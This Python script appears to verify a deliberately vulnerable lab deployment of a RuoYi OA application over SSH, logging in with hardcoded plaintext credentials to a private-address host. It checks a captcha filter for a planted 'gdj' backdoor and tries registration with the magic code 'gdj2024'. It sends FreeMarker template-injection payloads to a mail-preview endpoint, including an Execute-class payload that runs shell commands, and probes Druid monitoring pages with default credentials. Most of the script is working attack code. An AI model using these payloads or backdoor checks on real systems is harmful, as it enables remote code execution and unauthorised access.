#!/usr/bin/env python3
"""Check C1: CaptchaValidateFilter backdoor + FreeMarker SSTI + register"""
import paramiko
import sys
import urllib.parse

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

def run(ssh, cmd, timeout=30):
    print(f">>> {cmd[:200]}")
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode('utf-8', errors='replace')
    err = stderr.read().decode('utf-8', errors='replace')
    ec = stdout.channel.recv_exit_status()
    if out.strip():
        print(f"  {out.strip()[:2000]}")
    if err.strip() and ec != 0:
        print(f"  [err] {err.strip()[:300]}")
    return out, err, ec

c1 = paramiko.SSHClient()
c1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c1.connect('192.168.101.140', username='gdadmin', password='Gdadmin@123', timeout=10)

# ============================================================
# 1. Check CaptchaValidateFilter for gdj backdoor
# ============================================================
print("=" * 60)
print("1. CHECK CaptchaValidateFilter FOR gdj BACKDOOR")
print("=" * 60)

# Extract the class from the framework JAR
run(c1, 'cd /tmp && unzip -o /opt/oa-app/ruoyi/ruoyi-framework/target/ruoyi-framework-4.8.3.jar '
     'BOOT-INF/classes/com/ruoyi/framework/shiro/web/filter/captcha/CaptchaValidateFilter.class 2>&1')

# Check if gdj string exists in the binary
print("\n--- Searching for 'gdj' in class file ---")
run(c1, "grep -a 'gdj' /tmp/BOOT-INF/classes/com/ruoyi/framework/shiro/web/filter/captcha/CaptchaValidateFilter.class || echo 'NOT FOUND'")

# Also check source file
print("\n--- Looking for source file ---")
run(c1, "find /opt/oa-app -name 'CaptchaValidateFilter.java' -type f 2>/dev/null")

# Check the JAR was actually built from the modified source
print("\n--- Check JAR build timestamp vs source modification ---")
run(c1, "ls -la /opt/oa-app/ruoyi/ruoyi-framework/target/ruoyi-framework-4.8.3.jar 2>/dev/null")
run(c1, "ls -la /opt/oa-app/ruoyi/ruoyi-framework/src/main/java/com/ruoyi/framework/shiro/web/filter/captcha/CaptchaValidateFilter.java 2>/dev/null")

# ============================================================
# 2. Decompile the class to check the actual code
# ============================================================
print("\n" + "=" * 60)
print("2. DECOMPILE CaptchaValidateFilter")
print("=" * 60)

# Use javap to see method signatures
run(c1, 'javap -c -p /tmp/BOOT-INF/classes/com/ruoyi/framework/shiro/web/filter/captcha/CaptchaValidateFilter.class 2>&1 | head -80')

# ============================================================
# 3. Test Register with different formats
# ============================================================
print("\n" + "=" * 60)
print("3. REGISTER WITH DIFFERENT FORMATS")
print("=" * 60)

# Try form-encoded with curl -d
run(c1, 'curl -s -X POST http://localhost:8080/register '
     '-d "username=testuser10&password=Test@1234&confirmPassword=Test@1234&email=test10@test.com&validateCode=gdj2024"')

# Try with correct param names (RuoYi uses different names)
run(c1, 'curl -s http://localhost:8080/captcha/captchaImage 2>&1 | head -5')
# Get the captcha code from session - first get a session
run(c1, 'curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt http://localhost:8080/captcha/captchaImage -o /tmp/captcha.png 2>&1')

# ============================================================
# 4. Test FreeMarker SSTI
# ============================================================
print("\n" + "=" * 60)
print("4. TEST FreeMarker SSTI")
print("=" * 60)

# Basic test - does it render FreeMarker?
# Use Python to URL-encode the payload
payloads = [
    ("math", "${7*7}"),
    ("upper", "${'test'?upper_case}"),
    ("rce", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"),
    ("rce2", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"),
]

for name, payload in payloads:
    encoded = urllib.parse.quote(payload, safe='')
    url = f"http://localhost:8080/mail/preview?content={encoded}"
    print(f"\n--- {name} ---")
    print(f"Payload: {payload[:80]}")
    run(c1, f"curl -s '{url}'")

# ============================================================
# 5. Check druid endpoints
# ============================================================
print("\n" + "=" * 60)
print("5. CHECK DRUID")
print("=" * 60)
run(c1, 'curl -s -u ruoyi:123456 http://localhost:8080/druid/datasource.json 2>&1 | head -20')
run(c1, 'curl -s -u ruoyi:123456 http://localhost:8080/druid/index.html 2>&1 | head -20')

c1.close()
print("\nDone!")
